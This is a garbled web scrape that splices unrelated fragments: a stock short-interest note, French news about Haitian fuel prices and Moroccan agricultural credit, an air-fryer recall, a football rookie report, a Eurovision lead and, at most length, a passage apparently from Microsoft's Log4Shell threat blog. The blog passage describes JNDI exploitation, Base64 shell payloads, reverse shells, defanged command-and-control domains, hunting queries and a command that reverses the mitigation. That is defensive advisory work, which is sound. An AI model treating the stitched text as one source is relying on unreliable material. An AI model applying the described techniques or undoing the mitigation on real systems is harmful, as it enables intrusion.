Howard on the Preservation Board during her first go-around with the board when ADM tried to demolish it said the demolition of the building would be a real loss.",,,,,,,,,,,,

Gallagher's Recent Short Interest - Arthur J. Gallagher (NYSE:AJG),"Loading... Loading...

Arthur J. Gallagher's AJG short percent of float has risen 5.71% since its last report. The company recently reported that it has 2.11 million shares sold short which is 1.11% of all regular shares that are available for trading. Based on its trading volume it would take traders 2.65 days to cover their short positions on average.

Why Short Interest Matters

Short interest is the number of shares that have been sold short but have not yet been covered or closed out. Short selling is when a trader sells shares of a company they do not own with the hope that the price will fall. Traders make money from short selling if the price of the stock falls and they lose if it rises.

Short interest is important to track because it can act as an indicator of market sentiment towards a particular stock. An increase in short interest can signal that investors have become more bearish while a decrease in short interest can signal they have become more bullish.

As you can see from the chart above the percentage of shares that are sold short for Arthur J. Gallagher has grown since its last report. This does not mean that the stock is going to fall in the near-term but traders should be aware that more shares are being shorted.

Comparing Arthur J. Gallagher's Short Interest Against Its Peers

Peer comparison is a popular technique amongst analysts and investors for gauging how well a company is performing. A company's peer is another company that has similar characteristics to it such as industry size age and financial structure. You can find a company's peer group by reading its 10-K proxy filing or by doing your own similarity analysis.

According to Benzinga Pro Arthur J. Gallagher's peer group average for short interest as a percentage of float is 3.76% which means the company has less short interest than most of its peers.

Ricard Pierre membre du Secteur démocratique et populaire (SDP) en agissant ainsi a trahi une idée qu’il a combattue sous l’administration de Jovenel Moïse.

Dimanche 12 décembre 2021 ((rezonodwes.com))–

Moins de 24 heures après l’application de la décision de revoir à la hausse les prix des produits pétroliers la grogne s’intensifie déjà dans la rue. Dans le secteur du transport en commun l’impact de l’augmentation des prix du carburant s’est fait vite ressentir.

Des chauffeurs et passagers sont divisés sur le tarif à appliquer dans certains circuits de la zone métropolitaine de Port-au-Prince constate-t-on.

S’il est vrai que le gouvernement de facto à travers son ministre du Commerce et de l’Industrie Ricardin Saint-Jean a clairement rassuré la population sur la nécessité de maintenir les anciens tarifs dans le transport public il n’en demeure pas vrai que les propriétaires de véhicules engagés dans ce secteur présnetent un avis contraire.

Samedi nombreux sont des chauffeurs assurant les trajets Delmas/Pétion-Ville Port-au-Prince/Clercine Croix-des-Bouquets/Delmas à décider délibérément de fixer le prix de leur trajet.

Ils mettent en cause l’augmentation du diesel passant de 169 Gourdes à 353 Gourdes pour un gallon. Des passagers évoquant la mesure gouvernementale refusent de leur côté de céder aux chantages des chauffeurs jusqu’à provoquer des bras de fer entre ces deux groupes.

Des invectives des menaces verbales des échanges musclés entre passagers et chauffeurs caractérisent la réalité actuelle du transport en commun.

Dans la foulée des mésententes d’autres chauffeurs décident de suspendre momentanément le trafic interurbain en attendant une position responsable de l’État sur la fixation des tarifs des circuits ont-ils avancé.

Par ailleurs le Ministère des affaires sociales et du travail (MAST) organe chargé de réguler et de jouer le gendarme dans l’application de la nouvelle grille tarifaire est aux abonnés absents dénoncent des observateurs. Les citoyens sont livrés à eux-mêmes et le risque d’affrontements dans le secteur du transport public demeure imminent.

Avec ces nouvelles données des usagers du transport en commun se livrent constamment dans un combat avec les chauffeurs pour veiller au respect du maintien des prix. Dans un autre registre des salariés voient déjà leurs économies fragiles anéanties. Ils vont devoir dépenser davantage pour leur déplacement sans espérer une revalorisation salariale de leur employeur.

Le bouc émissaire devient les dirigeants du SDP qui après avoir critiqué la décision en juillet 2018 et encouragé la population à se mobiliser contre Jovenel Moïse s’affichent en partisans de la mesure et en en faisant la promotion.

L’intervention de l’ancien sénateur du Sud’Est Ricard Pierre pour justifier l’augmentation des prix du carburant à la pompe dans un contexte d’insécurité généralisée et de l’effondrement du pouvoir d’achat de la population a scandalisé l’opinion.

Cela dit il reste important de coordonner les opérations et de travailler en synergie avec toutes les parties prenantes» indique Hanane Aajli directeur pôle accompagnement du développement agricole au sein du groupe Crédit Agricole du Maroc.

En ce sens un dispositif complet est mis en place par le groupe bancaire. Si l’on ne prend que les récents programmes Intelaka et Al Moustatmir Al Qaraoui CAM a accordé 6 600 crédits au 31 octobre 2021 totalisant environ 800 MDH. Par typologie d’investissement 27% des projets financés dans ce cadre portent sur la mécanisation agricole et 21% sur les systèmes d’irrigation et les pompes solaires. Dans ce cadre CAM a mis en place un dispositif spécifique pour accompagner tous les types de porteurs de projets ainsi qu’une structure dédiée le Centre d’étude et de crédits TPE qui assure la prise en charge et le traitement optimal des dossiers de financement d’Al Moustatmir Al Qaraoui.

Par ailleurs des mécanismes de financement et d’accompagnement sur-mesure sont mis en place. «Il s’agit d’un accompagnement 180° qui englobe aussi bien le volet financier que l’aspect non financier lié à l’expertise et à la formation» explique Mme Aajli. Ils sont conçus sous forme de packs portant le nom “CAM-Génération Green’’. Le 1er «CAM-Génération Green Jeunes» est destiné aux jeunes agriculteurs ainsi qu’à la jeune entreprise rurale de services à l’agriculture. Il vise à accompagner tout porteur d’un projet viable dans le cadre d’une première installation ou d’une reconversion. Le second «CAM-Génération Green Melkisation» bénéficie aux ayants-droit des terres collectives à titre individuel (personnes physiques) ou en groupement agricole (personne morale). Il leur permet de réaliser des projets de modernisation des activités et pratiques agricoles. Il est à signaler que ces packs sont intégrés dans le cadre du programme Al Moustatmir Al Qaraoui et bénéficient des mêmes conditions le caractérisant notamment les taux d’intérêt à 175 % HT. De plus ils intègrent plusieurs composantes dont le crédit bancaire les subventions FDA classiques les incitations financières spécifiques du ministère l’appui technique ainsi que l’expertise et l’accompagnement non financier.

Comme le digital prend une part de plus en plus importante dans tous les secteurs d’activité économique celui de l’agriculture n’est pas en reste. La banque a développé une panoplie de produits pour faciliter l’accès aux services bancaires spécialement dans le milieu rural dont Imtiazat-e dédiée aux agriculteurs. «Cette application propose entre autres les demandes de financement ou de couverture contre des risques… Des partenariats ont été conclus avec des intervenants comme la Sonacos pour faciliter le paiement de l’achat des engrais par exemple et l’office régional de mise en valeur agricole de Kénitra comme 1ère expérience qui sera généralisée dans tout le Maroc» détaille El Mustapha Benabou directeur pôle banque digitale au CAM. Cela en plus de la possibilité d’accéder à des conseils pratiques.

Par ailleurs la banque a également lancé Al Filahi Cash (AFC) établissement de paiement qui offre une panoplie de services spécifiques via l’application AlfilahiPay ses agences en propre ou son réseau d’agents via la banque. AFC dispose aussi d’agréments pour offrir des services d’intermédiation bancaire de base.",https://news.google.com/articles/CBMijAFodHRwczovL3d3dy52YWxldXJzYWN0dWVsbGVzLmNvbS9yZWdpb25zL2F1dmVyZ25lLXJob25lLWFscGVzL2xvaXJlL3NhaW50LWV0aWVubmUvc29jaWV0ZS9zYWludC1ldGllbm5lLWxhLXBvbGljZS1tdW5pY2lwYWxlLXNlLW1ldC1lbi1ncmV2ZdIBAA?hl=en-US&gl=US&ceid=US%3Aen,Saint-Etienne : la police municipale se met en grève,"Un deuxième samedi de grève pour la police municipale de Saint-Etienne.

The air fryer is a Power XL brand and firefighters said it's been linked to numerous safety recalls. The Consumer Product Safety Commission (CPSC) issued a recall back in December 2023 for potential burn hazard. The Shrewsbury Fire Department has since contacted the CPSC to request they analyze the air fryer and determine if further recalls are needed.

(0:28)

Open Extended Reactions

ASHBURN Va. -- Jayden Daniels' first rookie minicamp practice did not include any ""wow"" moments where he could show his speed or all of his arm talent. It was a routine one-hour workout designed to get the rookies comfortable with the Washington Commanders playbook.

But during those 60 minutes his new teammates took notice of what Daniels could offer the Commanders.

""He's a stud"" third-round receiver Luke McCaffrey said. ""I know he's one heck of a quarterback and a lot of fun to play with from a personality standpoint. I've had a blast in these 24 hours with him. ... He's just fun to be around; he's good energy.""

Added second-round tight end Ben Sinnott: ""He has the 'it' factor.""

Washington selected Daniels with the second pick in last month's draft making him the franchise's latest hope at quarterback. The team started eight different passers in the last four years and nobody has started for more than three consecutive seasons since Mark Rypien from 1989 to '93. Since that time Washington has drafted five other quarterbacks in the first round and none became the long-term answer.

Daniels' presence led to more interest than usual in the Commanders' first rookie workout as approximately 55 media members attended -- at least 20 more than usual according to a team spokesman. He smiled often and during breaks could be seen laughing with coaches or teammates. He lofted accurate deep passes down the middle of the field against no defenders and was accurate during a 7-on-7 drill with one off-target pass that resulted in a one-handed grab by undrafted free agent Marcus Rosemy-Jacksaint.

Daniels said Friday was just about ""day one install"" of the playbook. But he also said he soaked in seeing his helmet in the locker and putting on his yellow No. 5 practice jersey.

""Man it was awesome"" he said. He added that scenes like this brought out ""that 9-year-old kid in me just realizing that his dreams came true and now I'm here but I've still got a long way to go.""

Sinnott said he worked out with Daniels at times in the offseason -- as well as undrafted free agent quarterback Sam Hartman. He said he saw Daniels' accuracy on film and then realized it in person. He saw him as others did create plays with his legs as well.

""He's a super talented kid a great dude I really like to be around and hopefully grow with"" Sinnott said. ""There are just guys who players naturally get attracted to and revolve around and he's got that personality where you want to work with him and want to watch film with him and you want to be out here working with him.""

Daniels said this weekend is also about developing his leadership in the NFL before he starts working with the veterans at OTA practices.

""Just being myself being a hard worker"" he said. ""Don't try to be somebody I'm not. People see who's authentic and who's not. Try to make connections talk to people. Obviously I'm 23 it's a lot of different age ranges in this locker room so try to relate as much as possible show them I'm all about the team I'm all about hard work.""

And for now it's about learning the playbook and then earning the starting job.

""Just going through the lumps of being a rookie and trying to learn how to be a pro"" Daniels said. ""I don't have a definitive answer for you what I needed to work on. I'm just trying to learn as much as possible.""",https://news.google.com/articles/CBMiY2h0dHBzOi8vd3d3Lndhc2hpbmd0b25wb3N0LmNvbS9lbnRlcnRhaW5tZW50L211c2ljLzIwMjQvMDUvMTAvYWJiYS1hbm5pdmVyc2FyeS1ldXJvdmlzaW9uLXdhdGVybG9vL9IBAA?hl=en-US&gl=US&ceid=US%3Aen,Sweden celebrates Abba at this year's Eurovision Song Contest,"MALMO Sweden — The Eurovision stars aligned last year as Sweden claimed its seventh victory — a feat shared only with Ireland — bringing the song contest back to Abba’s home country this year just in time to celebrate the 50th anniversary of their 1974 win.

This open-source component is widely used across many suppliers’ software and services. By nature of Log4j being a component the vulnerabilities affect not only applications that use vulnerable libraries but also any services that use these applications so customers may not readily know how widespread the issue is in their environment. Customers are encouraged to utilize scripts and scanning tools to assess their risk and impact. Microsoft has observed attackers using many of the same inventory techniques to locate targets. Sophisticated adversaries (like nation-state actors) and commodity attackers alike have been observed taking advantage of these vulnerabilities. There is high potential for the expanded use of the vulnerabilities. In January we started seeing attackers taking advantage of the vulnerabilities in internet-facing systems eventually deploying ransomware. We have observed many existing attackers adding exploits of these vulnerabilities in their existing malware kits and tactics from coin miners to hands-on-keyboard attacks. Organizations may not realize their environments may already be compromised. Microsoft recommends customers to do additional review of devices where vulnerable installations are discovered. At this juncture customers should assume broad availability of exploit code and scanning capabilities to be a real and present danger to their environments. Due to the many software and services that are impacted and given the pace of updates this is expected to have a long tail for remediation requiring ongoing sustainable vigilance. January 19 2022 update – We added new information about an unrelated vulnerability we discovered while investigating Log4j attacks. January 21 2022 update – Threat and vulnerability management can now discover vulnerable Log4j libraries including Log4j files and other files containing Log4j packaged into Uber-JAR files.

The remote code execution (RCE) vulnerabilities in Apache Log4j 2 referred to as “Log4Shell” (CVE-2021-44228 CVE-2021-45046 CVE-2021-44832) has presented a new attack vector and gained broad attention due to its severity and potential for widespread exploitation. The majority of attacks we have observed so far have been mainly mass-scanning coin mining establishing remote shells and red-team activity but it’s highly likely that attackers will continue adding exploits for these vulnerabilities to their toolkits.

With nation-state actors testing and implementing the exploit and known ransomware-associated access brokers using it we highly recommend applying security patches and updating affected products and services as soon as possible. Refer to the Microsoft Security Response Center blog for technical information about the vulnerabilities and mitigation recommendations.

Meanwhile defenders need to be diligent in detecting hunting for and investigating related threats. This blog reports our observations and analysis of attacks that take advantage of the Log4j 2 vulnerabilities. It also provides our recommendations for using Microsoft security solutions to (1) find and remediate vulnerable services and systems and (2) detect investigate and respond to attacks.

This blog covers the following topics:

Attack vectors and observed activity

Microsoft’s unified threat intelligence team comprising the Microsoft Threat Intelligence Center (MSTIC) Microsoft 365 Defender Threat Intelligence Team RiskIQ and the Microsoft Detection and Response Team (DART) among others have been tracking threats taking advantage of the remote code execution (RCE) vulnerabilities in Apache Log4j 2 referred to as “Log4Shell”.

The bulk of attacks that Microsoft has observed at this time have been related to mass scanning by attackers attempting to thumbprint vulnerable systems as well as scanning by security companies and researchers. An example pattern of attack would appear in a web request log with strings like the following:

An attacker performs an HTTP request against a target system which generates a log using Log4j 2 that leverages JNDI to perform a request to the attacker-controlled site. The vulnerability then causes the exploited process to reach out to the site and execute the payload. In many observed attacks the attacker-owned parameter is a DNS logging system intended to log a request to the site to fingerprint the vulnerable systems.

The specially crafted string that enables exploitation of the vulnerabilities can be identified through several components. The string contains “jndi” which refers to the Java Naming and Directory Interface. Following this the protocol such as “ldap” “ldaps” “rmi” “dns” “iiop” or “http” precedes the attacker domain.

As security teams work to detect the exploitation attackers have added obfuscation to these requests to evade detections based on request patterns. We’ve seen things like running a lower or upper command within the exploitation string and even more complicated obfuscation attempts such as the following that are all trying to bypass string-matching detections:

The vast majority of observed activity has been scanning but exploitation and post-exploitation activities have also been observed. Based on the nature of the vulnerabilities once the attacker has full access and control of an application they can perform a myriad of objectives. Microsoft has observed activities including installing coin miners using Cobalt Strike to enable credential theft and lateral movement and exfiltrating data from compromised systems.

Exploitation continues on non-Microsoft hosted Minecraft servers

Minecraft customers running their own servers are encouraged to deploy the latest Minecraft server update as soon as possible to protect their users. More information can be found here: https://aka.ms/mclog.

Microsoft can confirm public reports of the Khonsari ransomware family being delivered as payload post-exploitation as discussed by Bitdefender. In Microsoft Defender Antivirus data we have observed a small number of cases of this being launched from compromised Minecraft clients connected to modified Minecraft servers running a vulnerable version of Log4j 2 via the use of a third-party Minecraft mods loader.

In these cases an adversary sends a malicious in-game message to a vulnerable Minecraft server which exploits CVE-2021-44228 to retrieve and execute an attacker-hosted payload on both the server and on connected vulnerable clients. We observed exploitation leading to a malicious Java class file that is the Khonsari ransomware which is then executed in the context of javaw.exe to ransom the device.

While it’s uncommon for Minecraft to be installed in enterprise networks we have also observed PowerShell-based reverse shells being dropped to Minecraft client systems via the same malicious message technique giving an actor full access to a compromised system which they then use to run Mimikatz to steal credentials. These techniques are typically associated with enterprise compromises with the intent of lateral movement. Microsoft has not observed any follow-on activity from this campaign at this time indicating that the attacker may be gathering access for later use.

Due to the shifts in the threat landscape Microsoft reiterates the guidance for Minecraft customers running their own servers to deploy the latest Minecraft server update and for players to exercise caution by only connecting to trusted Minecraft servers.

Nation-state activity

April 2023 update – Microsoft Threat Intelligence has shifted to a new threat actor naming taxonomy aligned around the theme of weather. To learn more about this evolution how the new taxonomy represents the origin unique traits and impact of threat actors and a complete mapping of threat actor names read this blog: Microsoft shifts to a new threat actor naming taxonomy.

MSTIC has also observed the CVE-2021-44228 vulnerability being used by multiple tracked nation-state activity groups originating from China Iran North Korea and Turkey. This activity ranges from experimentation during development integration of the vulnerabilities to in-the-wild payload deployment and exploitation against targets to achieve the actor’s objectives.

For example MSTIC has observed PHOSPHORUS an Iranian actor known to deploy ransomware acquiring and making modifications of the Log4j exploit. We assess that PHOSPHORUS has operationalized these modifications.

In addition HAFNIUM a threat actor group operating out of China has been observed utilizing the vulnerability to attack virtualization infrastructure to extend their typical targeting. In these attacks HAFNIUM-associated systems were observed using a DNS service typically associated with testing activity to fingerprint systems.

Access brokers associated with ransomware

MSTIC and the Microsoft 365 Defender team have confirmed that multiple tracked activity groups acting as access brokers have begun using the vulnerability to gain initial access to target networks. These access brokers then sell access to these networks to ransomware-as-a-service affiliates. We have observed these groups attempting exploitation on both Linux and Windows systems which may lead to an increase in human-operated ransomware impact on both of these operating system platforms.

Mass scanning activity continues

The vast majority of traffic observed by Microsoft remains mass scanners by both attackers and security researchers. Microsoft has observed rapid uptake of the vulnerability into existing botnets like Mirai existing campaigns previously targeting vulnerable Elasticsearch systems to deploy cryptocurrency miners and activity deploying the Tsunami backdoor to Linux systems. Many of these campaigns are running concurrent scanning and exploitation activities for both Windows and Linux systems using Base64 commands included in the JDNI:ldap:// request to launch bash commands on Linux and PowerShell on Windows.

Microsoft has also continued to observe malicious activity performing data leakage via the vulnerability without dropping a payload. This attack scenario could be especially impactful against network devices that have SSL termination where the actor could leak secrets and data.

Additional RAT payloads

We’ve observed the dropping of additional remote access toolkits and reverse shells via exploitation of CVE-2021-44228 which actors then use for hands-on-keyboard attacks. In addition to the Cobalt Strike and PowerShell reverse shells seen in earlier reports we’ve also seen Meterpreter Bladabindi and HabitsRAT. Follow-on activities from these shells have not been observed at this time but these tools have the ability to steal passwords and move laterally.

This activity is split between a percentage of small-scale campaigns that may be more targeted or related to testing and the addition of CVE-2021-44428 to existing campaigns that were exploiting vulnerabilities to drop remote access tools. In the HabitsRAT case the campaign was seen overlapping with infrastructure used in prior campaigns.

Webtoos

The Webtoos malware has DDoS capabilities and persistence mechanisms that could allow an attacker to perform additional activities. As reported by RiskIQ Microsoft has seen Webtoos being deployed via the vulnerability. Attackers’ use of this malware or intent is not known at this time but the campaign and infrastructure have been in use and have been targeting both Linux and Windows systems prior to this vulnerability.

A note on testing services and assumed benign activity

While services such as interact.sh canarytokens.org burpsuite and dnslog.cn may be used by IT organizations to profile their own threat footprints Microsoft encourages including these services in your hunting queries and validating observations of these in environments to ensure they are intentional and legitimate activity.

Exploitation in internet-facing systems leads to ransomware

As early as January 4 attackers started exploiting the CVE-2021-44228 vulnerability in internet-facing systems running VMware Horizon. Our investigation shows that successful intrusions in these campaigns led to the deployment of the NightSky ransomware.

These attacks are performed by a China-based ransomware operator that we’re tracking as DEV-0401. DEV-0401 has previously deployed multiple ransomware families including LockFile AtomSilo and Rook and has similarly exploited Internet-facing systems running Confluence (CVE-2021-26084) and on-premises Exchange servers (CVE-2021-34473).

Based on our analysis the attackers are using command and control (CnC) servers that spoof legitimate domains. These include service[.]trendmrcio[.]com api[.]rogerscorp[.]org api[.]sophosantivirus[.]ga apicon[.]nvidialab[.]us w2zmii7kjb81pfj0ped16kg8szyvmk.burpcollaborator[.]net and 139[.]180[.]217[.]203.

Attackers propagating Log4j attacks via previously undisclosed vulnerability

During our sustained monitoring of threats taking advantage of the Log4j 2 vulnerabilities we observed activity related to attacks being propagated via a previously undisclosed vulnerability in the SolarWinds Serv-U software. We discovered that the vulnerability now tracked as CVE-2021-35247 is an input validation vulnerability that could allow attackers to build a query given some input and send that query over the network without sanitation.

We reported our discovery to SolarWinds and we’d like to thank their teams for immediately investigating and working to remediate the vulnerability. We strongly recommend affected customers to apply security updates released by referring to the SolarWinds advisory here: https://www.solarwinds.com/trust-center/security-advisories/cve-2021-35247.

Microsoft customers can use threat and vulnerability management in Microsoft Defender for Endpoint to identify and remediate devices that have this vulnerability. In addition Microsoft Defender Antivirus and Microsoft Defender for Endpoint detect malicious behavior related to the observed activity.

Finding and remediating vulnerable apps and systems

Threat and vulnerability management

Threat and vulnerability management capabilities in Microsoft Defender for Endpoint monitor an organization’s overall security posture and equip customers with real-time insights into organizational risk through continuous vulnerability discovery intelligent prioritization and the ability to seamlessly remediate vulnerabilities.

Discovering affected components software and devices via a unified Log4j dashboard

Threat and vulnerability management automatically and seamlessly identifies devices affected by the Log4j vulnerabilities and the associated risk in the environment and significantly reduces time-to-mitigate. Microsoft continues to iterate on these features based on the latest information from the threat landscape. This section will be updated as those new features become available for customers.

The wide use of Log4j across many supplier’s products challenge defender teams to mitigate and address the risks posed by the vulnerabilities (CVE-2021-44228 or CVE-2021-45046). The threat and vulnerability management capabilities within Microsoft 365 Defender can help identify vulnerable installations. On December 15 we began rolling out updates to provide a consolidated view of the organizational exposure to the Log4j 2 vulnerabilities—on the device software and vulnerable component level—through a range of automated complementing capabilities. These capabilities are supported on Windows 10 Windows 11 and Windows Server 2008 2012 and 2016. They are also supported on Linux but they require updating the Microsoft Defender for Endpoint Linux client to version 101.52.57 (30.121092.15257.0) or later. The updates include the following:

Discovery of vulnerable Log4j library components (paths) on devices

Discovery of vulnerable installed applications that contain the Log4j library on devices

A dedicated Log4j dashboard that provides a consolidated view of various findings across vulnerable devices vulnerable software and vulnerable files

Introduction of a new schema in advanced hunting DeviceTvmSoftwareEvidenceBeta which surfaces file-level findings from the disk and provides the ability to correlate them with additional context in advanced hunting:

DeviceTvmSoftwareEvidenceBeta | mv-expand DiskPaths | where DiskPaths contains ""log4j"" | project DeviceId SoftwareName SoftwareVendor SoftwareVersion DiskPaths

To complement this new table the existing DeviceTvmSoftwareVulnerabilities table in advanced hunting can be used to identify vulnerabilities in installed software on devices:

DeviceTvmSoftwareVulnerabilities | where CveId in (""CVE-2021-44228"" ""CVE-2021-45046"")

These capabilities integrate with the existing threat and vulnerability management experience and are gradually rolling out. As of December 27 2021 discovery is based on installed application CPEs that are known to be vulnerable to Log4j RCE as well as the presence of vulnerable Log4j Java Archive (JAR) files.

As of January 20 2022 threat and vulnerability management can discover vulnerable Log4j libraries including Log4j files and other files containing Log4j packaged into Uber-JAR files. This capability is supported on Windows 10 Windows 11 Windows Server 2019 and Windows Server 2022. It is also supported on Windows Server 2012 R2 and Windows Server 2016 using the Microsoft Defender for Endpoint solution for earlier Windows server versions.

Threat and vulnerability management provides layers of detection to help customers discover and mitigate vulnerable Log4j components. Specifically it:

determines if a JAR file contains a vulnerable Log4j file by examining JAR files and searching for the following file: \META-INF\maven\org.apache.logging.log4j\log4j-core\pom.properties; if the said file exists the Log4j version is read and extracted searches for the JndiLookup.class file inside the JAR file by looking for paths that contain the string “/log4j/core/lookup/JndiLookup.class”; if the JndiLookup.class file exists threat and vulnerability management determines if this JAR contains a Log4j file with the version defined in pom.properties searches for any vulnerable Log4j-core JAR files embedded within nested-JAR by searching for paths that contain any of these strings: lib/log4j-core-

WEB-INF/lib/log4j-core-

App-INF/lib/log4j-core-

Figure 3. Threat and vulnerability management finds exposed paths

Figure 4. Threat and vulnerability management finds exposed devices based on vulnerable software and vulnerable files detected on disk

Note: Scan results may take some time to reach full coverage and the number of discovered devices may be low at first but will grow as the scan reaches more devices. A regularly updated list of vulnerable products can be viewed in the Microsoft 365 Defender portal with matching recommendations. We will continue to review and update this list as new information becomes available.

Through device discovery unmanaged devices with products and services affected by the vulnerabilities are also surfaced so they can be onboarded and secured.

Figure 5. Finding vulnerable applications and devices via software inventory

Applying mitigation directly in the Microsoft 365 Defender portal

We have released two new threat and vulnerability management capabilities that can significantly simplify the process of turning off JNDI lookup a workaround that can prevent the exploitation of the Log4j vulnerabilities on most devices using an environment variable called LOG4J_FORMAT_MSG_NO_LOOKUPS. These new capabilities provide security teams with the following:

View the mitigation status for each affected device. This can help prioritize mitigation and/or patching of devices based on their mitigation status.

To use this feature open the Exposed devices tab in the dedicated CVE-2021-44228 dashboard and review the Mitigation status column. Note that it may take a few hours for the updated mitigation status of a device to be reflected.

Figure 6. Viewing each device’s mitigation status

Apply the mitigation (that is turn off JNDI lookup) on devices directly from the portal. This feature is currently available for Windows devices only.

The mitigation will be applied directly via the Microsoft Defender for Endpoint client. To view the mitigation options click on the Mitigation options button in the Log4j dashboard:

You can choose to apply the mitigation to all exposed devices or select specific devices for which you would like to apply it. To complete the process and apply the mitigation on devices click Create mitigation action.

Figure 7. Creating mitigation actions for exposed devices.

In cases where the mitigation needs to be reverted follow these steps:

Open an elevated PowerShell window Run the following command:

[Environment]::SetEnvironmentVariable(""LOG4J_FORMAT_MSG_NO_LOOKUPS"" $null [EnvironmentVariableTarget]::Machine)

The change will take effect after the device restarts.

Microsoft 365 Defender advanced hunting

Advance hunting can also surface affected software. This query looks for possibly vulnerable applications using the affected Log4j component. Triage the results to determine applications and programs that may need to be patched and updated.

Microsoft Defender for Cloud

Microsoft Defender for servers

Organizations using Microsoft Defender for Cloud can use Inventory tools to begin investigations before there’s a CVE number. With Inventory tools there are two ways to determine exposure across hybrid and multi-cloud resources:

Vulnerability assessment findings – Organizations who have enabled any of the vulnerability assessment tools (whether it’s Microsoft Defender for Endpoint’s threat and vulnerability management module the built-in Qualys scanner or a bring your own license solution) they can search by CVE identifier:

Figure 9. Searching vulnerability assessment findings by CVE identifier

Software inventory – With the combined integration with Microsoft Defender for Endpoint and Microsoft Defender for servers organizations can search for resources by installed applications and discover resources running the vulnerable software:

Figure 10. Searching software inventory by installed applications

Note that this doesn’t replace a search of your codebase. It’s possible that software with integrated Log4j libraries won’t appear in this list but this is helpful in the initial triage of investigations related to this incident. For more information about how Microsoft Defender for Cloud finds machines affected by CVE-2021-44228 read this tech community post.

Microsoft Defender for Containers

Microsoft Defender for Containers is capable of discovering images affected by the vulnerabilities recently discovered in Log4j 2: CVE-2021-44228 CVE-2021-45046 and CVE-2021-45105. Images are automatically scanned for vulnerabilities in three different use cases: when pushed to an Azure container registry when pulled from an Azure container registry and when container images are running on a Kubernetes cluster. Additional information on supported scan triggers and Kubernetes clusters can be found here.

Log4j binaries are discovered whether they are deployed via a package manager copied to the image as stand-alone binaries or included within a JAR Archive (up to one level of nesting).

We will continue to follow up on any additional developments and will update our detection capabilities if any additional vulnerabilities are reported.

Finding affected images

To find vulnerable images across registries using the Azure portal navigate to the Microsoft Defender for Cloud service under Azure Portal. Open the Container Registry images should have vulnerability findings resolved recommendation and search findings for the relevant CVEs.

Figure 11. Finding images with the CVE-2021-45046 vulnerability

Find vulnerable running images on Azure portal [preview]

To view only vulnerable images that are currently running on a Kubernetes cluster using the Azure portal navigate to the Microsoft Defender for Cloud service under Azure Portal. Open the Vulnerabilities in running container images should be remediated (powered by Qualys) recommendation and search findings for the relevant CVEs:

Figure 12. Finding running images with the CVE-2021-45046 vulnerability

Note: This recommendation requires clusters to run Microsoft Defender security profile to provide visibility on running images.

Search Azure Resource Graph data

Azure Resource Graph (ARG) provides instant access to resource information across cloud environments with robust filtering grouping and sorting capabilities. It’s a quick and efficient way to query information across Azure subscriptions programmatically or from within the Azure portal. ARG provides another way to query resource data for resources found to be affected by the Log4j vulnerability.

The following query finds resources affected by the Log4j vulnerability across subscriptions. Use the additional data field across all returned results to obtain details on vulnerable resources:

securityresources | where type =~ ""microsoft.security/assessments/subassessments"" | extend assessmentKey=extract(@""(?i)providers/Microsoft.Security/assessments/([^/]*)"" 1 id) subAssessmentId=tostring(properties.id) parentResourceId= extract(""(.+)/providers/Microsoft.Security"" 1 id) | extend Props = parse_json(properties) | extend additionalData = Props.additionalData | extend cves = additionalData.cve | where isnotempty(cves) and array_length(cves) > 0 | mv-expand cves | where tostring(cves) has ""CVE-2021-44228"" or tostring(cves) has ""CVE-2021-45046"" or tostring(cves) has ""CVE-2021-45105""

Microsoft Defender for Endpoint

Users of Microsoft Defender for Endpoint can turn on the following attack surface reduction rule to block or audit some observed activity associated with this threat.

Block executable files from running unless they meet a prevalence age or trusted list criterion

Due to the broad network exploitation nature of vectors through which this vulnerability can be exploited and the fact that applying mitigations holistically across large environments will take time we encourage defenders to look for signs of post-exploitation rather than fully relying on prevention. Observed post exploitation activity such as coin mining lateral movement and Cobalt Strike are detected with behavior-based detections.

Alerts with the following titles in the Security Center indicate threat activity related to exploitation of the Log4j vulnerability on your network and should be immediately investigated and remediated. These alerts are supported on both Windows and Linux platforms:

Log4j exploitation detected – detects known behaviors that attackers perform following successful exploitation of the CVE-2021-44228 vulnerability

– detects known behaviors that attackers perform following successful exploitation of the CVE-2021-44228 vulnerability Log4j exploitation artifacts detected (previously titled Possible exploitation of CVE-2021-44228) – detects coin miners shells backdoor and payloads such as Cobalt Strike used by attackers post-exploitation

(previously titled Possible exploitation of CVE-2021-44228) – detects coin miners shells backdoor and payloads such as Cobalt Strike used by attackers post-exploitation Log4j exploitation network artifacts detected (previously titled Network connection seen in CVE-2021-44228 exploitation) – detects network traffic connecting traffic connecting to an address associated with CVE-2021-44228 scanning or exploitation activity

The following alerts may indicate exploitation attempts or testing/scanning activity. Microsoft advises customers to investigate with caution as these alerts don’t necessarily indicate successful exploitation:

Possible target of Log4j exploitation – detects a possible attempt to exploit the remote code execution vulnerability in the Log4j component of an Apache server in communication received by this device

detects a possible attempt to exploit the remote code execution vulnerability in the Log4j component of an Apache server in communication this device Possible target of Log4j vulnerability scanning – detects a possible attempt to scan for the remote code execution vulnerability in a Log4j component of an Apache server in communication received by this device

– detects multiple behaviors including suspicious command launch post-exploitation Possible Log4j exploitation (CVE-2021-44228) – inactive initially covered several of the above now replaced with more specific titles

The following alerts detect activities that have been observed in attacks that utilize at least one of the Log4j vulnerabilities. However these alerts can also indicate activity that is not related to the vulnerability. We are listing them here as it is highly recommended that they are triaged and remediated immediately given their severity and the potential that they could be related to Log4j exploitation:

Suspicious remote PowerShell execution

Download of file associated with digital currency mining

Process associated with digital currency mining

Cobalt Strike command and control detected

Suspicious network traffic connection to C2 Server

Ongoing hands-on-keyboard attacker activity detected (Cobalt Strike)

Some of the alerts mentioned above utilize the enhanced network inspection capabilities in Microsoft Defender for Endpoint. These alerts correlate several network and endpoint signals into high-confidence detection of successful exploitation as well as providing detailed evidence artifacts valuable for triage and investigation of detected activities.

Microsoft Sentinel queries

Microsoft Sentinel customers can use the following detection queries to look for this activity:

This hunting query looks for possible attempts to exploit a remote code execution vulnerability in the Log4j component of Apache. Attackers may attempt to launch arbitrary code by passing specific commands to a server which are then logged and executed by the Log4j component.

This query hunts through EXECVE syslog data generated by AUOMS to find instances of cryptocurrency miners being downloaded. It returns a table of suspicious command lines.

This hunting query looks in Azure Web Application Firewall data to find possible exploitation attempts for CVE-2021-44228 involving Log4j vulnerability.

This hunting query identifies a match across various data feeds for IP IOCs related to the Log4j exploit described in CVE-2021-44228.

This hunting query helps detect post-compromise suspicious shell scripts that attackers use for downloading and executing malicious files. This technique is often used by attackers and was recently used to exploit the vulnerability in Log4j component of Apache to evade detection and stay persistent or for more exploitation in the network.

This query alerts on a positive pattern match by Azure WAF for CVE-2021-44228 Log4j exploitation attempt. If possible it then decodes the malicious command for further analysis.

